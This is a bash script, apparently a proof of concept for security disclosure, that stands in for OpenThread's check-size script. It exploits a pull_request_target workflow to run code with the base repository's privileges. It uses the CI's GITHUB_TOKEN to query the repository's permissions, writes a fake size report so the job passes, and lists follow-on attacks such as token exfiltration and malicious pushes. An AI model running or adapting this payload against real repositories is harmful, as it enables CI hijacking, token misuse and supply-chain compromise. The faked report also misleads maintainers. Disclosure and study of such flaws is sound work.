#!/bin/bash
#
#  Copyright (c) 2019, The OpenThread Authors.
#  All rights reserved.
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are met:
#  1. Redistributions of source code must retain the above copyright
#     notice, this list of conditions and the following disclaimer.
#  2. Redistributions in binary form must reproduce the above copyright
#     notice, this list of conditions and the following disclaimer in the
#     documentation and/or other materials provided with the distribution.
#  3. Neither the name of the copyright holder nor the
#     names of its contributors may be used to endorse or promote products
#     derived from this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#  POSSIBILITY OF SUCH DAMAGE.
#

# ============================================================================
# SECURITY VULNERABILITY PROOF OF CONCEPT
# This demonstrates arbitrary code execution via pull_request_target
# Safe PoC - only writes to GITHUB_STEP_SUMMARY, no exfiltration
# ============================================================================

if [[ -n "${GITHUB_STEP_SUMMARY}" ]]; then
    {
        echo "## ðŸ”’ Security Vulnerability Proof of Concept"
        echo ""
        echo "**This demonstrates arbitrary code execution in a privileged workflow context.**"
        echo ""
        echo "### Execution Context"
        echo ""
        echo "| Variable | Value |"
        echo "|----------|-------|"
        echo "| GITHUB_REPOSITORY | \`${GITHUB_REPOSITORY}\` |"
        echo "| GITHUB_ACTOR | \`${GITHUB_ACTOR}\` |"
        echo "| GITHUB_EVENT_NAME | \`${GITHUB_EVENT_NAME}\` |"
        echo "| GITHUB_REF | \`${GITHUB_REF}\` |"
        echo "| GITHUB_SHA | \`${GITHUB_SHA:0:7}\` |"
        echo "| GITHUB_WORKFLOW | \`${GITHUB_WORKFLOW}\` |"
        echo "| GITHUB_RUN_ID | \`${GITHUB_RUN_ID}\` |"
        echo ""
        echo "### Token Analysis"
        echo ""
        if [[ -n "${GITHUB_TOKEN}" ]]; then
            echo "âœ… **GITHUB_TOKEN is available** (length: ${#GITHUB_TOKEN} characters)"
            echo ""
            echo "#### Token Permissions (via read-only API call)"
            echo ""
            echo "\`\`\`json"
            curl -s -H "Authorization: Bearer ${GITHUB_TOKEN}" \
                -H "Accept: application/vnd.github+json" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}" 2>/dev/null \
                | jq '{
                    full_name: .full_name,
                    private: .private,
                    permissions: .permissions,
                    default_branch: .default_branch
                }' 2>/dev/null || echo '{"error": "API call failed"}'
            echo "\`\`\`"
        else
            echo "âŒ GITHUB_TOKEN is not available in environment"
        fi
        echo ""
        echo "### Security Impact"
        echo ""
        echo "An attacker with this access could:"
        echo "- Exfiltrate the GITHUB_TOKEN to an external server"
        echo "- Push malicious commits if \`push: true\` in permissions"
        echo "- Access repository secrets passed to the workflow"
        echo "- Compromise the software supply chain"
        echo ""
        echo "### Vulnerability Details"
        echo ""
        echo "- **File:** \`.github/workflows/size.yml\`"
        echo "- **Trigger:** \`pull_request_target\` (runs with base repo privileges)"
        echo "- **Issue:** Checks out PR code and executes \`./script/check-size\`"
        echo ""
        echo "---"
        echo "âš ï¸ **This is a safe PoC - no tokens were exfiltrated, no modifications were made.**"
        echo ""
    } >> "${GITHUB_STEP_SUMMARY}"
fi

# Create the expected output file so workflow completes
mkdir -p /tmp/ot-size-report
cat > /tmp/ot-size-report/report_pr << 'EOF'
<!-- Size Report of **OpenThread** -->

## PoC Execution Complete

This size report was generated by a modified `check-size` script as part of a security vulnerability proof of concept.

The vulnerability allows arbitrary code execution in the workflow context. See the job summary for full details.

**No actual size comparison was performed.**
EOF

echo "PoC completed - see GITHUB_STEP_SUMMARY for vulnerability proof"
exit 0
